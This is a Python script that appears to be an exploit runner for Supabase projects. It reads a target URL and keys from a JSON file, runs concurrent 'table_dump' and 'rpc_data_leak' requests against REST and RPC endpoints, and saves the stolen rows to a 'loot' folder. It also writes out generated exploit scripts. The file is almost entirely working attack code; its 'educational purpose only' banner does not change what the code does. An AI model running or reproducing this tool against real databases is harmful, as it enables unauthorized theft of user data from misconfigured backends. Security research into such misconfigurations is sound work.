import httpx, json, asyncio, os, time
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
console = Console()
async def run_exploit(auto_confirm=False):
    console.print("\n")
    console.rule("[bold red]SUPABASE EXPLOIT PoC RUNNER[/]")
    console.print("[center bold yellow]EDUCATIONAL PURPOSE ONLY - DO NOT USE WITHOUT PERMISSION[/]", justify="center")
    console.print("\n")
    if not auto_confirm:
        confirm = console.input("[bold yellow]   Type YES to continue: [/]").strip().upper()
        if confirm != "YES":
            console.print("   [red]Aborted.[/]")
            return
    else:
        console.print("   [yellow][!] Auto-confirm enabled. Proceeding...[/]")
    if not os.path.exists("poc/exploit_generated.json"):
        console.print("   [red]exploit_generated.json not found[/]")
        return
    with open("poc/exploit_generated.json") as f:
        poc_data = json.load(f)
    timestamp = int(time.time())
    report_dir = f"exploit_report_{timestamp}"
    loot_dir = os.path.join(report_dir, "loot")
    scripts_dir = os.path.join(report_dir, "scripts")
    os.makedirs(loot_dir, exist_ok=True)
    os.makedirs(scripts_dir, exist_ok=True)
    with open(os.path.join(report_dir, "exploit_generated.json"), "w", encoding="utf-8") as f:
        json.dump(poc_data, f, indent=2)
    if "exploit_scripts" in poc_data:
        save_exploit_scripts(poc_data["exploit_scripts"], scripts_dir)
    exploits = poc_data.get("exploits", [])
    if not exploits:
        console.print("[yellow][!] No automated exploits found in POC data.[/]")
        return
    target = poc_data["target"].rstrip("/")
    headers = {"apikey": poc_data.get("apikey", ""), "Authorization": f"Bearer {poc_data.get('service_role_key', '')}" if poc_data.get("service_role_key") else ""}
    console.print(f"\n[bold cyan][*] Target: {target}[/]")
    console.print(f"[bold cyan][*] Output Directory: {report_dir}[/]\n")
    summary_results = []
    async with httpx.AsyncClient(base_url=target, headers=headers, timeout=30) as client:
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
            task = progress.add_task("[cyan]Running Exploits...", total=len(exploits))
            
            async def execute_single_exploit(exp):
                exp_type = exp['type']
                target_name = exp.get('table','') or exp.get('rpc_name','')
                progress.update(task, description=f"[cyan]Exploiting {exp_type} -> {target_name}...")
                status = "FAILED"
                details = ""
                
                try:
                    if exp_type == "table_dump":
                        table = exp["table"]
                        params = exp.get("filter") or {"limit": 500}
                        r = await client.get(f"/rest/v1/{table}", params=params)
                        if r.status_code in (200, 206):
                            data = r.json()
                            count = len(data)
                            filename = os.path.join(loot_dir, f"{table}_dump.json")
                            with open(filename, "w", encoding="utf-8") as f:
                                json.dump(data, f, indent=2, ensure_ascii=False)
                            status = "SUCCESS"
                            details = f"Dumped {count} rows"
                        else:
                            details = f"HTTP {r.status_code}"
                            
                    elif exp_type == "rpc_data_leak":
                        r = await client.post(f"/rest/v1/rpc/{exp['rpc_name']}", json=exp.get("payload", {}))
                        if r.status_code in (200, 206):
                            data = r.json()
                            count = len(data) if isinstance(data, list) else 1
                            filename = os.path.join(loot_dir, f"rpc_{exp['rpc_name']}.json")
                            with open(filename, "w", encoding="utf-8") as f:
                                json.dump(data, f, indent=2, ensure_ascii=False)
                            status = "SUCCESS"
                            details = f"Leaked {count} records"
                        else:
                            details = f"HTTP {r.status_code}"
                except Exception as e:
                    details = str(e)
                
                progress.advance(task)
                return {"type": exp_type, "target": target_name, "status": status, "details": details}

            summary_results = await asyncio.gather(*[execute_single_exploit(exp) for exp in exploits])
    table = Table(title="Exploit Execution Summary", expand=True)
    table.add_column("Type", style="cyan")
    table.add_column("Target", style="magenta")
    table.add_column("Status", justify="center")
    table.add_column("Details", style="white")
    for res in summary_results:
        status_style = "green" if res["status"] == "SUCCESS" else "red"
        table.add_row(res["type"], res["target"], f"[{status_style}]{res['status']}[/]", res["details"])
    console.print("\n")
    console.print(table)
    console.print(f"\n[bold green]✔ Exploit Run Complete. Check '{report_dir}' for loot and scripts.[/]")
def save_exploit_scripts(scripts, output_dir):
    extensions = {
        "python": "py",
        "javascript": "js",
        "go": "go",
        "curl": "sh"
    }
    console.print(f"\n[bold cyan][*] Saving generated exploit scripts...[/]")
    for lang, code in scripts.items():
        ext = extensions.get(lang, "txt")
        filename = os.path.join(output_dir, f"exploit_{lang}.{ext}")
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(code)
            console.print(f"    [green]✔ Saved {lang}: {filename}[/]")
        except Exception as e:
            console.print(f"    [red]! Failed to save {lang}: {e}[/]")
if __name__ == "__main__":
    asyncio.run(run_exploit())